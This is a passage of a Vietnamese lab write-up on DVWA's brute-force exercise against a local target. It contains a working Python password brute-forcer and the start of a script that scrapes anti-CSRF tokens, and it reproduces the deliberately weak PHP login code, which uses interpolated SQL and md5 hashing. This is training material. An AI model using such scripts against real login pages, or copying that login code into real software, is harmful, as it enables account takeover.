<a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a>    <span class=s1>&#39;Sec-Fetch-Dest&#39;</span><span class=p>:</span> <span class=s1>&#39;document&#39;</span><span class=p>,</span>
<a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a>    <span class=s1>&#39;Referer&#39;</span><span class=p>:</span> <span class=s1>&#39;http://localhost:4280/vulnerabilities/brute/&#39;</span><span class=p>,</span>
<a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a>    <span class=s1>&#39;Accept-Encoding&#39;</span><span class=p>:</span> <span class=s1>&#39;gzip, deflate&#39;</span><span class=p>,</span>
<a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a>    <span class=s1>&#39;Accept-Language&#39;</span><span class=p>:</span> <span class=s1>&#39;en-US,en;q=0.9&#39;</span><span class=p>,</span>
<a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a>    <span class=s1>&#39;Cookie&#39;</span><span class=p>:</span> <span class=s1>&#39;PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low&#39;</span>
<a id=__codelineno-1-23 name=__codelineno-1-23 href=#__codelineno-1-23></a><span class=p>}</span>
<a id=__codelineno-1-24 name=__codelineno-1-24 href=#__codelineno-1-24></a>
<a id=__codelineno-1-25 name=__codelineno-1-25 href=#__codelineno-1-25></a><span class=c1># Đọc danh sách mật khẩu từ wordlist</span>
<a id=__codelineno-1-26 name=__codelineno-1-26 href=#__codelineno-1-26></a><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;file_name/path_file&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>password_file</span><span class=p>:</span>
<a id=__codelineno-1-27 name=__codelineno-1-27 href=#__codelineno-1-27></a>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>password_file</span><span class=p>:</span>
<a id=__codelineno-1-28 name=__codelineno-1-28 href=#__codelineno-1-28></a>        <span class=c1># Loại bỏ ký tự xuống dòng từ mật khẩu</span>
<a id=__codelineno-1-29 name=__codelineno-1-29 href=#__codelineno-1-29></a>        <span class=n>password</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
<a id=__codelineno-1-30 name=__codelineno-1-30 href=#__codelineno-1-30></a>        <span class=c1># Thêm mật khẩu vào params_base</span>
<a id=__codelineno-1-31 name=__codelineno-1-31 href=#__codelineno-1-31></a>        <span class=n>params</span> <span class=o>=</span> <span class=n>params_base</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
<a id=__codelineno-1-32 name=__codelineno-1-32 href=#__codelineno-1-32></a>        <span class=n>params</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>password</span>
<a id=__codelineno-1-33 name=__codelineno-1-33 href=#__codelineno-1-33></a>
<a id=__codelineno-1-34 name=__codelineno-1-34 href=#__codelineno-1-34></a>        <span class=c1># Gửi yêu cầu GET với mật khẩu khác nhau</span>
<a id=__codelineno-1-35 name=__codelineno-1-35 href=#__codelineno-1-35></a>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
<a id=__codelineno-1-36 name=__codelineno-1-36 href=#__codelineno-1-36></a>
<a id=__codelineno-1-37 name=__codelineno-1-37 href=#__codelineno-1-37></a>    <span class=c1># Kiểm tra và xử lý phản hồi - dòng `Username and/or password incorrect.` trong Sourcecode</span>
<a id=__codelineno-1-38 name=__codelineno-1-38 href=#__codelineno-1-38></a>        <span class=k>if</span> <span class=s2>&quot;Username and/or password incorrect.&quot;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
<a id=__codelineno-1-39 name=__codelineno-1-39 href=#__codelineno-1-39></a>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;Đã tìm thấy mật khẩu đúng: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-1-40 name=__codelineno-1-40 href=#__codelineno-1-40></a>            <span class=k>break</span>
</code></pre></div> <p>Và kết quả như hình dưới</p> <p><img alt src=image.png></p> <hr> <h2 id=security-level-medium><strong>Security Level: Medium</strong><a class=headerlink href=#security-level-medium title="Permanent link">&para;</a></h2> <p>Source code</p> <div class=highlight><span class=filename>vulnerabilities/brute/source/medium.php</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=cp>&lt;?php</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=k>if</span><span class=p>(</span> <span class=nb>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>    <span class=c1>// Sanitise username input</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$user</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a>    <span class=c1>// Sanitise password input</span>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$pass</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a>    <span class=c1>// Check the database</span>
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&quot;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&quot;</span><span class=p>;</span>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a>
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a>    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-2-18 name=__codelineno-2-18 href=#__codelineno-2-18></a>        <span class=c1>// Get users details</span>
<a id=__codelineno-2-19 name=__codelineno-2-19 href=#__codelineno-2-19></a>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>
<a id=__codelineno-2-20 name=__codelineno-2-20 href=#__codelineno-2-20></a>        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&quot;avatar&quot;</span><span class=p>];</span>
<a id=__codelineno-2-21 name=__codelineno-2-21 href=#__codelineno-2-21></a>
<a id=__codelineno-2-22 name=__codelineno-2-22 href=#__codelineno-2-22></a>        <span class=c1>// Login successful</span>
<a id=__codelineno-2-23 name=__codelineno-2-23 href=#__codelineno-2-23></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-2-24 name=__codelineno-2-24 href=#__codelineno-2-24></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;img src=</span><span class=se>\&quot;</span><span class=si>{</span><span class=nv>$avatar</span><span class=si>}</span><span class=se>\&quot;</span><span class=s2> /&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-2-25 name=__codelineno-2-25 href=#__codelineno-2-25></a>    <span class=p>}</span>
<a id=__codelineno-2-26 name=__codelineno-2-26 href=#__codelineno-2-26></a>    <span class=k>else</span> <span class=p>{</span>
<a id=__codelineno-2-27 name=__codelineno-2-27 href=#__codelineno-2-27></a>        <span class=c1>// Login failed</span>
<a id=__codelineno-2-28 name=__codelineno-2-28 href=#__codelineno-2-28></a>        <span class=nb>sleep</span><span class=p>(</span> <span class=mi>2</span> <span class=p>);</span>
<a id=__codelineno-2-29 name=__codelineno-2-29 href=#__codelineno-2-29></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-2-30 name=__codelineno-2-30 href=#__codelineno-2-30></a>    <span class=p>}</span>
<a id=__codelineno-2-31 name=__codelineno-2-31 href=#__codelineno-2-31></a>
<a id=__codelineno-2-32 name=__codelineno-2-32 href=#__codelineno-2-32></a>    <span class=p>((</span><span class=nb>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>
<a id=__codelineno-2-33 name=__codelineno-2-33 href=#__codelineno-2-33></a><span class=p>}</span>
<a id=__codelineno-2-34 name=__codelineno-2-34 href=#__codelineno-2-34></a>
<a id=__codelineno-2-35 name=__codelineno-2-35 href=#__codelineno-2-35></a><span class=cp>?&gt;</span><span class=x> </span>
</code></pre></div> <h3 id=analysis_1><strong>Analysis</strong><a class=headerlink href=#analysis_1 title="Permanent link">&para;</a></h3> <p>Ở phần cấp độ này, bạn cũng dễ dàng có thể thực hiện Brute Force như ở cấp độ Low. Nhưng phải chờ 2 giây sau khi login fail (dòng sleep(2) trong mã nguồn).</p> <h3 id=exploition_1><strong>Exploition</strong><a class=headerlink href=#exploition_1 title="Permanent link">&para;</a></h3> <p>Ta sẽ dùng chính source code ở cấp độ Low để bypass cấp độ này.</p> <hr> <h2 id=security-level-high><strong>Security Level: High</strong><a class=headerlink href=#security-level-high title="Permanent link">&para;</a></h2> <p>Source code</p> <div class=highlight><span class=filename>vulnerabilities/brute/source/high.php</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=cp>&lt;?php</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=k>if</span><span class=p>(</span> <span class=nb>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>    <span class=c1>// Check Anti-CSRF token</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>    <span class=nx>checkToken</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;user_token&#39;</span> <span class=p>],</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;session_token&#39;</span> <span class=p>],</span> <span class=s1>&#39;index.php&#39;</span> <span class=p>);</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a>    <span class=c1>// Sanitise username input</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nb>stripslashes</span><span class=p>(</span> <span class=nv>$user</span> <span class=p>);</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$user</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a>    <span class=c1>// Sanitise password input</span>
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>stripslashes</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$pass</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-3-16 name=__codelineno-3-16 href=#__codelineno-3-16></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-3-17 name=__codelineno-3-17 href=#__codelineno-3-17></a>
<a id=__codelineno-3-18 name=__codelineno-3-18 href=#__codelineno-3-18></a>    <span class=c1>// Check database</span>
<a id=__codelineno-3-19 name=__codelineno-3-19 href=#__codelineno-3-19></a>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&quot;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&quot;</span><span class=p>;</span>
<a id=__codelineno-3-20 name=__codelineno-3-20 href=#__codelineno-3-20></a>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
<a id=__codelineno-3-21 name=__codelineno-3-21 href=#__codelineno-3-21></a>
<a id=__codelineno-3-22 name=__codelineno-3-22 href=#__codelineno-3-22></a>    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-3-23 name=__codelineno-3-23 href=#__codelineno-3-23></a>        <span class=c1>// Get users details</span>
<a id=__codelineno-3-24 name=__codelineno-3-24 href=#__codelineno-3-24></a>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>
<a id=__codelineno-3-25 name=__codelineno-3-25 href=#__codelineno-3-25></a>        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&quot;avatar&quot;</span><span class=p>];</span>
<a id=__codelineno-3-26 name=__codelineno-3-26 href=#__codelineno-3-26></a>
<a id=__codelineno-3-27 name=__codelineno-3-27 href=#__codelineno-3-27></a>        <span class=c1>// Login successful</span>
<a id=__codelineno-3-28 name=__codelineno-3-28 href=#__codelineno-3-28></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-3-29 name=__codelineno-3-29 href=#__codelineno-3-29></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;img src=</span><span class=se>\&quot;</span><span class=si>{</span><span class=nv>$avatar</span><span class=si>}</span><span class=se>\&quot;</span><span class=s2> /&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-3-30 name=__codelineno-3-30 href=#__codelineno-3-30></a>    <span class=p>}</span>
<a id=__codelineno-3-31 name=__codelineno-3-31 href=#__codelineno-3-31></a>    <span class=k>else</span> <span class=p>{</span>
<a id=__codelineno-3-32 name=__codelineno-3-32 href=#__codelineno-3-32></a>        <span class=c1>// Login failed</span>
<a id=__codelineno-3-33 name=__codelineno-3-33 href=#__codelineno-3-33></a>        <span class=nb>sleep</span><span class=p>(</span> <span class=nb>rand</span><span class=p>(</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span> <span class=p>)</span> <span class=p>);</span>
<a id=__codelineno-3-34 name=__codelineno-3-34 href=#__codelineno-3-34></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-3-35 name=__codelineno-3-35 href=#__codelineno-3-35></a>    <span class=p>}</span>
<a id=__codelineno-3-36 name=__codelineno-3-36 href=#__codelineno-3-36></a>
<a id=__codelineno-3-37 name=__codelineno-3-37 href=#__codelineno-3-37></a>    <span class=p>((</span><span class=nb>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>
<a id=__codelineno-3-38 name=__codelineno-3-38 href=#__codelineno-3-38></a><span class=p>}</span>
<a id=__codelineno-3-39 name=__codelineno-3-39 href=#__codelineno-3-39></a>
<a id=__codelineno-3-40 name=__codelineno-3-40 href=#__codelineno-3-40></a><span class=c1>// Generate Anti-CSRF token</span>
<a id=__codelineno-3-41 name=__codelineno-3-41 href=#__codelineno-3-41></a><span class=nx>generateSessionToken</span><span class=p>();</span>
<a id=__codelineno-3-42 name=__codelineno-3-42 href=#__codelineno-3-42></a>
<a id=__codelineno-3-43 name=__codelineno-3-43 href=#__codelineno-3-43></a><span class=cp>?&gt;</span><span class=x> </span>
</code></pre></div> <h3 id=analysis_2><strong>Analysis</strong><a class=headerlink href=#analysis_2 title="Permanent link">&para;</a></h3> <p>Ở cấp độ này, họ nâng tầm hơn bằng việc thêm <a href=https://owasp.org/www-community/attacks/csrf>CSRF token</a> dưới tên user_token. Tức nếu request mà sai thì ngay lập tức trang web sẽ tạo một user_token mới. </p> <p> <figure><img src=image-1.png><figcaption>user_token</figcaption> </figure> <img alt src=image-2.png></p> <p>Vì user_token nó gắn ở trang web và chỉ <code>hidden</code> thôi, nên ta có thể khai thác ở điểm này.</p> <p>Điều chúng ta cần hiện giờ là bắt được user_token của trang web trước khi thực thi công đoạn login. Tức là phải duyệt web lấy user_token trước, sau đó gắn nó vào gói request gửi login.</p> <p>Khúc này, ta hỏi ChatGPT thôi :3</p> <h3 id=exploition_2><strong>Exploition</strong><a class=headerlink href=#exploition_2 title="Permanent link">&para;</a></h3> <p>Roài, triển khai thôi.</p> <div class=highlight><span class=filename>find.py</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=kn>import</span> <span class=nn>requests</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a><span class=kn>import</span> <span class=nn>re</span>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=c1># URL của trang web bạn muốn truy cập</span>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:4280/vulnerabilities/brute/&#39;</span>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=c1># Tạo yêu cầu GET để tải trang web</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a>
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=c1># Kiểm tra xem yêu cầu có thành công không</span>
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a><span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a>    <span class=c1># Sử dụng biểu thức chính quy để tìm giá trị của thẻ có name=&quot;user_token&quot;</span>
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>    <span class=n>pattern</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;input.*?type=[&quot;</span><span class=se>\&#39;</span><span class=s1>]hidden[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?name=[&quot;</span><span class=se>\&#39;</span><span class=s1>]user_token[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?value=[&quot;</span><span class=se>\&#39;</span><span class=s1>](.*?)[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?&gt;&#39;</span>
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a>    <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<a id=__codelineno-4-15 name=__codelineno-4-15 href=#__codelineno-4-15></a>
<a id=__codelineno-4-16 name=__codelineno-4-16 href=#__codelineno-4-16></a>    <span class=c1># Kiểm tra xem có tìm thấy giá trị hay không</span>
<a id=__codelineno-4-17 name=__codelineno-4-17 href=#__codelineno-4-17></a>    <span class=k>if</span> <span class=n>match</span><span class=p>:</span>
<a id=__codelineno-4-18 name=__codelineno-4-18 href=#__codelineno-4-18></a>        <span class=n>user_token_value</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
